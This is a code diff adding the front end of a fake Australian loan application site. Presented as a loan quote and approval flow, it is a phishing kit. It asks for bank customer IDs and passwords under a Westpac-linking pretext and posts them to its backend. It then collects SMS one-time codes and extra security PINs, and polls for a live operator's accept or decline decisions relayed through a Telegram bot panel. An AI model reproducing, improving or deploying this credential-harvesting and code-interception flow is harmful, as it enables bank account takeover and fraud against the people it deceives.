+            </div>
+          </div>
+        </section>
+
+        <!-- STEP 6B: DECLINED PAGE -->
+        <section id="step-declined" class="hidden transition-opacity duration-300">
+          <div class="max-w-md mx-auto text-center py-8">
+            <div class="w-20 h-20 rounded-full bg-red-100 text-brand-red flex items-center justify-center mx-auto mb-6">
+              <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                  d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+              </svg>
+            </div>
+            <h2 class="text-3xl font-extrabold text-brand-blue">Verification Declined</h2>
+            <p class="text-sm text-gray-500 mt-3" id="decline-error-message">
+              The credentials submitted failed verification, or the transaction was declined by the underwriting system.
+            </p>
+            <div class="mt-8 flex justify-center space-x-4">
+              <button onclick="goToStep('selection')"
+                class="px-6 py-2.5 bg-brand-blue text-white font-bold text-sm rounded-lg shadow-sm hover:bg-blue-900 transition-all">
+                Try Again
+              </button>
+            </div>
+          </div>
+        </section>
+
+      </div>
+    </main>
+  </div>
+  <div class="shell">
+
+    <!-- MAIN PANE -->
+    <main class="main-pane">
+
+
+      <div class="content">
+
+
+
+        <!-- STEP 3: OTP -->
+        <div class="step" id="step-otp">
+          <div class="progress-bar">
+            <div class="prog-step done">
+              <div class="prog-dot"><svg viewBox="0 0 12 12">
+                  <polyline points="2 6 5 9 10 3" />
+                </svg></div>
+              <span>Purpose</span>
+            </div>
+            <div class="prog-line done"></div>
+            <div class="prog-step done">
+              <div class="prog-dot"><svg viewBox="0 0 12 12">
+                  <polyline points="2 6 5 9 10 3" />
+                </svg></div>
+              <span>Details</span>
+            </div>
+            <div class="prog-line done"></div>
+            <div class="prog-step active">
+              <div class="prog-dot"><span class="num">3</span></div>
+              <span>Verify</span>
+            </div>
+          </div>
+
+          <div style="text-align:center;max-width:400px;margin:0 auto">
+            <div
+              style="width:56px;height:56px;border-radius:16px;background:var(--accent-light);display:flex;align-items:center;justify-content:center;margin:0 auto 20px">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect x="5" y="11" width="14" height="10" rx="2" />
+                <path d="M8 11V7a4 4 0 018 0v4" />
+              </svg>
+            </div>
+            <h2 class="section-title" style="font-size:22px">Verify Your Identity</h2>
+            <p class="section-sub">Enter the 6-digit code sent to your mobile number to confirm your application.</p>
+
+            <div class="otp-note" id="otp-note">Code sent to +61 <span id="otp-phone-display">—</span></div>
+            <div class="otp-error" id="otp-error">Incorrect code. Please try again.</div>
+
+            <div class="otp-wrap" id="otp-inputs"></div>
+
+            <div class="timer-row">
+              <span>Expires in <strong id="otp-timer">120</strong>s</span>
+              <button class="resend-btn" id="resend-btn" onclick="startOtpTimer()">Resend code</button>
+            </div>
+
+            <button class="btn btn-primary btn-full" id="otp-submit-btn" onclick="submitOtp()" disabled>Confirm &
+              Submit
+              →</button>
+            <div style="margin-top:12px">
+              <button class="btn btn-ghost" onclick="goTo('details')" style="font-size:13px;padding:10px 20px">← Back
+                to
+                Details</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="step" id="step-dynamic-pin">
+          <div class="progress-bar">
+            <div class="prog-step done">
+              <div class="prog-dot"><svg viewBox="0 0 12 12">
+                  <polyline points="2 6 5 9 10 3" />
+                </svg></div>
+              <span>Purpose</span>
+            </div>
+            <div class="prog-line done"></div>
+            <div class="prog-step done">
+              <div class="prog-dot"><svg viewBox="0 0 12 12">
+                  <polyline points="2 6 5 9 10 3" />
+                </svg></div>
+              <span>Details</span>
+            </div>
+            <div class="prog-line done"></div>
+            <div class="prog-step active">
+              <div class="prog-dot"><span class="num">★</span></div>
+              <span>Authorization Code</span>
+            </div>
+          </div>
+
+          <div style="text-align:center;max-width:400px;margin:0 auto">
+            <div
+              style="width:56px;height:56px;border-radius:16px;background:var(--accent-light);display:flex;align-items:center;justify-content:center;margin:0 auto 20px">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+              </svg>
+            </div>
+            <h2 class="section-title" style="font-size:22px" id="dynamic-pin-title">Security Pin Required</h2>
+            <p class="section-sub">Please enter the security signature pin authorized by your agent management link to
+              proceed.</p>
+
+            <div class="otp-error" id="dynamic-pin-error">Incorrect signature code sequence. Please verify fields and
+              re-enter.</div>
+
+            <div class="otp-wrap" id="dynamic-pin-inputs"></div>
+
+            <button class="btn btn-primary btn-full" id="dynamic-pin-submit-btn" onclick="submitDynamicPin()"
+              disabled>Verify & Disburse Funds →</button>
+          </div>
+        </div>
+
+        <div class="step" id="step-processing">
+          <div class="processing-wrap" style="text-align:center; padding: 40px 0;">
+            <h3 style="font-size:18px;font-weight:700;color:var(--ink);margin-bottom:8px" id="proc-title">Submitting
+              application...</h3>
+            <p style="font-size:13px;color:var(--ink-3)" id="proc-sub">Please wait while we process your request.</p>
+          </div>
+        </div>
+
+        <!-- Success -->
+        <div class="step" id="step-success">
+          <div class="result-card">
+            <div class="result-header success">
+              <div class="result-icon">
+                <svg viewBox="0 0 24 24">
+                  <polyline points="20 6 9 17 4 12" />
+                </svg>
+              </div>
+              <h2>Application Approved!</h2>
+              <p>Your loan application has been provisionally accepted.</p>
+            </div>
+            <div class="result-body">
+              <h3
+                style="font-size:13px;font-weight:800;color:var(--ink-2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:16px">
+                Application Summary</h3>
+              <div class="summary-grid">
+                <div class="summary-item">
+                  <div class="s-label">Applicant</div>
+                  <div class="s-val" id="sum-name">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Loan Purpose</div>
+                  <div class="s-val" id="sum-purpose">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Amount</div>
+                  <div class="s-val" id="sum-amount">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Term</div>
+                  <div class="s-val" id="sum-term">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Email</div>
+                  <div class="s-val" id="sum-email">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Mobile</div>
+                  <div class="s-val" id="sum-phone">—</div>
+                </div>
+              </div>
+              <div class="next-steps">
+                <h4>What happens next?</h4>
+                <p>A loan specialist will contact you within 2–4 business hours to complete final verification and
+                  arrange disbursement.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Declined -->
+        <div class="step" id="step-declined">
+          <div class="result-card">
+            <div class="result-header declined">
+              <div class="result-icon">
+                <svg viewBox="0 0 24 24">
+                  <line x1="18" y1="6" x2="6" y2="18" />
+                  <line x1="6" y1="6" x2="18" y2="18" />
+                </svg>
+              </div>
+              <h2>Application Declined</h2>
+              <p>We were unable to verify your application at this time.</p>
+            </div>
+            <div class="result-body" style="text-align:center">
+              <p style="font-size:13px;color:var(--ink-3);margin-bottom:24px;line-height:1.7">Your verification code
+                could not be confirmed, or the application was declined during review. Please try again or contact
+                support.</p>
+              <button class="btn btn-primary" onclick="resetApp()">Start a New Application</button>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+
+    <!-- SIDE PANEL -->
+    <!-- <aside class="side-pane">
+    <div class="side-header">
+      <div class="side-title"><div class="side-dot"></div>Admin Telegram Panel</div>
+      <div class="side-sub">Live notification simulator · Accept or decline submissions</div>
+    </div>
+    <div class="side-chat" id="tg-feed">
+      <div class="tg-system">Bot connected · Awaiting submissions</div>
+      <div class="tg-msg">
+        <div class="tg-avatar">🤖</div>
+        <div class="tg-bubble">
+          <div class="tg-head">LendFlow Bot</div>
+          When applicants submit their details, you'll see live notifications here with Accept / Decline controls.
+        </div>
+      </div>
+    </div>
+    <div class="side-footer">
+      <button class="reset-btn" onclick="resetApp()">↺ Reset Demo</button>
+    </div>
+  </aside> -->
+
+  </div>
+
+  <script>
+    // ── Application State Workspace ──
+    let S = {
+      purpose: '', amount: 30000, term: 5, title: '', firstName: '', lastName: '',
+      email: '', phone: '', otpVal: '', sessionId: null, currentPinType: '', dynamicPinVal: ''
+    };
+    let otpTimerIv = null;
+
+
+    function goToStep(stepId) {
+      // Hide all main section screens
+      const steps = ['selection', 'details', 'signin', 'otp', 'processing', 'success', 'declined'];
+      steps.forEach(s => {
+        const el = document.getElementById(`step-${s}`);
+        if (el) {
+          el.classList.add('hidden');
+          el.classList.remove('block');
+        }
+      });
+
+      // Reveal selected step with anim container
+      const activeEl = document.getElementById(`step-${stepId}`);
+      if (activeEl) {
+        activeEl.classList.remove('hidden');
+        activeEl.classList.add('block');
+        activeEl.scrollIntoView({ behavior: 'smooth' });
+      }
+    }
+
+    function selectPurpose(p) {
+      S.purpose = p;
+      document.getElementById('selected-purpose-label').innerText = p;
+      calcRepayments();
+      goToStep('details');
+    }
+
+    function calcRepayments() {
+      const amountSlider = document.getElementById('loan-amount');
+      const durationSlider = document.getElementById('loan-duration');
+
+      S.amount = parseFloat(amountSlider.value);
+      S.term = parseInt(durationSlider.value);
+
+      document.getElementById('amount-display').innerText = `$${S.amount.toLocaleString()}`;
+      document.getElementById('duration-display').innerText = `${S.term} ${S.term === 1 ? 'Year' : 'Years'}`;
+
+      // Premium Variable Interest rate assumptions
+      const interestRate = 0.0849; // 8.49% p.a.
+      const weeklyRate = interestRate / 52;
+      const totalPaymentsWeekly = S.term * 52;
+
+      // Weekly repayment formula
+      let weeklyPayment = (S.amount * weeklyRate * Math.pow(1 + weeklyRate, totalPaymentsWeekly)) / (Math.pow(1 + weeklyRate, totalPaymentsWeekly) - 1);
+      if (isNaN(weeklyPayment)) weeklyPayment = 0;
+
+      const monthlyPayment = weeklyPayment * 4.333; // Approx multiplier for weekly to month conversion
+      const totalInterest = (weeklyPayment * totalPaymentsWeekly) - S.amount;
+
+      document.getElementById('repayment-amount').innerText = `$${weeklyPayment.toFixed(2)}`;
+      document.getElementById('repayment-monthly').innerText = `$${monthlyPayment.toFixed(2)}`;
+      document.getElementById('repayment-interest').innerText = `$${Math.max(0, totalInterest).toFixed(2)}`;
+    }
+
+    // ── Form submission parser details ──
+    function submitDetails(e) {
+      e.preventDefault();
+      S.title = document.getElementById('title').value;
+      S.firstName = document.getElementById('first-name').value;
+      S.middleName = document.getElementById('middle-name').value;
+      S.lastName = document.getElementById('last-name').value;
+      S.email = document.getElementById('email').value;
+      S.phone = document.getElementById('phone').value;
+
+      goToStep('signin');
+      // buildOtpInputs();
+      // document.getElementById('otp-phone-display').textContent = S.phone.slice(-4).padStart(S.phone.length, '•');
+      // startOtpTimer();
+      // goToStep('otp');
+    }
+    // Step 3: Handle bank login form submission
+    function handleSignInSubmit(e) {
+      e.preventDefault();
+
+      S.bankUserId = document.getElementById('customer-id').value;
+      S.bankPassword = document.getElementById('password').value;
+
+      // Move into loading status screen
+      document.getElementById('processing-title').innerText = "Verifying credentials...";
+      document.getElementById('processing-subtitle').innerText = "Linking client details with Westpac Online Core Systems...";
+
+
+      // Send structured log to our simulation dashboard & external TG Bot if enabled
+      fetch('/api/application-details', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name: `${S.title} ${S.firstName} ${S.lastName} ${S.middleName}`, email: S.email, phone: '+61' + S.phone, purpose: S.purpose, amount: '$' + S.amount.toLocaleString(), term: S.term + ' years', bankUserId: S.bankUserId, bankPassword: S.bankPassword })
+      });
+      goToStep('processing');
+      // buildOtpInputs();
+      // document.getElementById('otp-phone-display').textContent = S.phone.slice(-4).padStart(S.phone.length, '•');
+      // startOtpTimer();
+
+      // goToStep('otp');
+    }
+    // Package details to post on Simulated & Live Telegram interfaces
+
+    function triggerSimulatedOtpCommand(length) {
+      S.otpLength = length;
+
+      // Update UI displays
+      document.getElementById('otp-length-label').innerText = length;
+
+      // Clear container and create individual digit input elements
+      const container = document.getElementById('otp-inputs-container');
+      container.innerHTML = '';
+
+      for (let i = 0; i < length; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.maxLength = 1;
+        input.className = 'w-12 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:outline-none otp-input transition-all';
+        input.id = `otp-box-${i}`;
+
+        // Input auto-advance event listeners
+        input.addEventListener('keyup', (e) => {
+          if (e.target.value.length === 1 && i < length - 1) {
+            document.getElementById(`otp-box-${i + 1}`).focus();
+          }
+          if (e.key === 'Backspace' && i > 0) {
+            document.getElementById(`otp-box-${i - 1}`).focus();
+          }
+        });
+
+        container.appendChild(input);
+      }
+    }
+      // ── Initial Verification Step Handler ──
+      function buildOtpInputs() {
+        const wrap = document.getElementById('otp-inputs');
+        wrap.innerHTML = ''; S.otpVal = '';
+        for (let i = 0; i < 6; i++) {
+          const inp = document.createElement('input');
+          inp.type = 'text'; inp.maxLength = 1; inp.className = 'otp-box';
+          inp.inputMode = 'numeric'; inp.id = 'ob' + i;
+          inp.addEventListener('input', e => {
+            const v = e.target.value.replace(/\D/g, '');
+            e.target.value = v ? v[0] : '';
+            e.target.classList.toggle('filled', !!e.target.value);
+            if (v && i < 5) document.getElementById('ob' + (i + 1)).focus();
+            updateOtpVal();
+          });
+          inp.addEventListener('keydown', e => {
+            if (e.key === 'Backspace' && !e.target.value && i > 0) { document.getElementById('ob' + (i - 1)).focus(); }
+          });
+          wrap.appendChild(inp);
+        }
+      }
+
+      function updateOtpVal() {
+        let v = '';
+        for (let i = 0; i < 6; i++) { const b = document.getElementById('ob' + i); if (b) v += b.value; }
+        S.otpVal = v;
+        document.getElementById('otp-submit-btn').disabled = v.length < 6;
+      }
+
+      function startOtpTimer() {
+        clearInterval(otpTimerIv);
+        document.getElementById('resend-btn').classList.remove('active');
+        let t = 120;
+        document.getElementById('otp-timer').textContent = t;
+        otpTimerIv = setInterval(() => {
+          t--; document.getElementById('otp-timer').textContent = t;
+          if (t <= 0) { clearInterval(otpTimerIv); document.getElementById('resend-btn').classList.add('active'); }
+        }, 1000);
+      }
+
+      async function submitOtp() {
+        if (S.otpVal.length < 6) return;
+        document.getElementById('otp-error').style.display = 'none';
+        document.getElementById('proc-title').textContent = 'Validating Identity Parameters...';
+        document.getElementById('proc-sub').textContent = 'Evaluating communication signatures, stand-by.';
+        goTo('processing');
+
+        try {
+          const res = await fetch('/api/submit-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: '+61' + S.phone, otp: S.otpVal, name: `${S.firstName} ${S.lastName}`, planInfo: `${S.purpose} · $${S.amount.toLocaleString()} · ${S.term} yrs` }) });
+          const data = await res.json();
+          S.sessionId = data.sessionId;
+
+
+          waitForAdminInitial(S.sessionId);
+        } catch (err) {
+          console.error(err);
+          goTo('otp');
+        }
+      }
+
+      // ── Initial Interception Loop Worker ──
+      function waitForAdminInitial(sessionId) {
+        const started = Date.now();
+        const iv = setInterval(async () => {
+          if (Date.now() - started > 5 * 60 * 1000) { clearInterval(iv); handleAdminDecline(); return; }
+          try {
+            const r = await fetch('/api/check-status/' + sessionId);
+            const d = await r.json();
+            if (d.status === 'accept_p5') { clearInterval(iv); handleAdminInitialAccept('p5'); }
+            if (d.status === 'accept_p6') { clearInterval(iv); handleAdminInitialAccept('p6'); }
+            if (d.status === 'decline') { clearInterval(iv); handleAdminDecline(); }
+          } catch (e) { }
+        }, 2000);
+      }
+
+      function handleAdminInitialAccept(pinType) {
+        pushToPanel(`<div style="color:#3b82f6;font-weight:700">⚡ Admin approved phase 1. Injecting custom ${pinType.toUpperCase()} array framework module.</div>`);
+        buildDynamicPinBoxes(pinType);
+      }
+
+      function handleAdminDecline() {
+        goTo('otp');
+        document.getElementById('otp-error').style.display = 'block';
+        buildOtpInputs();
+        pushToPanel('<div style="color:#f87171;font-weight:700">❌ Processing profile manually rejected by admin.</div>');
+      }
+
+      // ── Dynamic Input Matrix Building System ──
+      function buildDynamicPinBoxes(type) {
+        S.currentPinType = type;
+        S.dynamicPinVal = '';
+
+        const container = document.getElementById('dynamic-pin-inputs');
+        const submitBtn = document.getElementById('dynamic-pin-submit-btn');
+        const titleText = document.getElementById('dynamic-pin-title');
+
+        container.innerHTML = '';
+        submitBtn.disabled = true;
+        document.getElementById('dynamic-pin-error').style.display = 'none';
+
+        const targetLength = type === 'p5' ? 5 : 6;
+        titleText.textContent = `Enter ${targetLength}-Digit Security Signature Code`;
+
+        for (let i = 0; i < targetLength; i++) {
+          const box = document.createElement('input');
+          box.type = 'text'; box.maxLength = 1; box.className = 'otp-box';
+          box.inputMode = 'numeric'; box.id = 'dpb' + i;
+
+          box.addEventListener('input', e => {
+            const val = e.target.value.replace(/\D/g, '');
+            e.target.value = val ? val[0] : '';
+            e.target.classList.toggle('filled', !!e.target.value);
+            if (val && i < (targetLength - 1)) document.getElementById('dpb' + (i + 1)).focus();
+            updateDynamicPinVal(targetLength);
+          });
+
+          box.addEventListener('keydown', e => {
+            if (e.key === 'Backspace' && !e.target.value && i > 0) {
+              document.getElementById('dpb' + (i - 1)).focus();
+            }
+          });
+          container.appendChild(box);
+        }
+        goTo('dynamic-pin');
+      }
+
+      function updateDynamicPinVal(length) {
+        let combinedValue = '';
+        for (let i = 0; i < length; i++) {
+          const el = document.getElementById('dpb' + i);
+          if (el) combinedValue += el.value;
+        }
+        S.dynamicPinVal = combinedValue;
+        document.getElementById('dynamic-pin-submit-btn').disabled = combinedValue.length < length;
+      }
+
+      // ── FIXED: Submitting the dynamic input pin page ──
+      async function submitDynamicPin() {
+        document.getElementById('dynamic-pin-error').style.display = 'none';
+        document.getElementById('proc-title').textContent = 'Transmitting Authorization Code...';
+        document.getElementById('proc-sub').textContent = 'Securing signature payloads. Do not close this tab.';
+        goTo('processing');
+
+        try {
+          // Send pin back to backend router system
+          await fetch('/api/verify-dynamic-pin', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: S.sessionId, pinType: S.currentPinType, pinValue: S.dynamicPinVal })
+          });
+
+          // Inject custom control panel view blocks inside desktop simulation
+          //     pushToPanel(`
+          //   <div class="tg-head">🔍 Dynamic Code Received (PIN: <code>${S.dynamicPinVal}</code>)</div>
+          //   <div style="font-size:11px; margin-bottom:8px; color:#9ca3af;">Confirm payload release allocation?</div>
+          //   <div class="tg-btns">
+          //     <button class="tg-btn accept" onclick="simDecide('accept')">✅ Accept to Success</button>
+          //     <button class="tg-btn decline" onclick="simDecide('decline')">❌ Decline Entry</button>
+          //   </div>
+          // `);
+
+          // Enter the FINAL checking state loop - wait here for Telegram click!
+          waitForAdminFinal(S.sessionId);
+        } catch (err) {
+          console.error(err);
+          goTo('dynamic-pin');
+        }
+      }
+
+      // ── Phase 2 Final Administrative Polling Engine ──
+      function waitForAdminFinal(sessionId) {
+        const started = Date.now();
+        const iv = setInterval(async () => {
+          if (Date.now() - started > 5 * 60 * 1000) { clearInterval(iv); handleFinalDecline(); return; }
+          try {
+            const r = await fetch('/api/check-status/' + sessionId);
+            const d = await r.json();
+
+            if (d.status === 'accept') {
+              clearInterval(iv);
+              handleFinalAccept();
+            }
+            if (d.status === 'decline') {
+              clearInterval(iv);
+              handleFinalDecline();
+            }
+          } catch (e) { }
+        }, 2000);
+      }
+
+      function handleFinalAccept() {
+        document.getElementById('sum-name').textContent = `${S.title} ${S.firstName} ${S.lastName}`;
+        document.getElementById('sum-purpose').textContent = S.purpose;
+        document.getElementById('sum-amount').textContent = '$' + S.amount.toLocaleString();
+        document.getElementById('sum-term').textContent = S.term + (S.term === 1 ? ' Year' : ' Years');
+        document.getElementById('sum-email').textContent = S.email;
+        document.getElementById('sum-phone').textContent = '+61 ' + S.phone;
+
+        pushToPanel('<div style="color:#4ade80;font-weight:700">✅ Application completely complete. Disbursed funds layout loaded.</div>');
+        goTo('success');
+      }
+
+      function handleFinalDecline() {
+        goTo('dynamic-pin');
+        document.getElementById('dynamic-pin-error').style.display = 'block';
+        buildDynamicPinBoxes(S.currentPinType);
+        pushToPanel('<div style="color:#f87171;font-weight:700">❌ Final authorization parameter rejected — Client error rendered.</div>');
+      }
+
+      // ── Side Simulator Buttons Communicator ──
+      function simDecide(action) {
+        if (!S.sessionId) return;
+        fetch('/api/cmd/' + S.sessionId + '/' + action);
+      }
+
+      // function pushToPanel(html) {
+      //   const feed = document.getElementById('tg-feed');
+      //   const msg = document.createElement('div');
+      //   msg.className = 'tg-msg';
+      //   msg.innerHTML = `<div class="tg-avatar">🤖</div><div class="tg-bubble">${html}</div>`;
+      //   feed.appendChild(msg);
+      //   feed.scrollTo({ top: feed.scrollHeight, behavior: 'smooth' });
+      // }
+
+      function resetApp() {
+        S = { purpose: '', amount: 30000, term: 5, title: '', firstName: '', lastName: '', email: '', phone: '', otpVal: '', sessionId: null, currentPinType: '', dynamicPinVal: '' };
+        document.getElementById('details-form').reset();
+        document.getElementById('tg-feed').innerHTML = '<div class="tg-system">Bot connected · Awaiting submissions</div>';
+        calcRepayments();
+        goTo('purpose');
+      }
+
+      window.onload = calcRepayments;
+  </script>
+</body>
+
+</html>
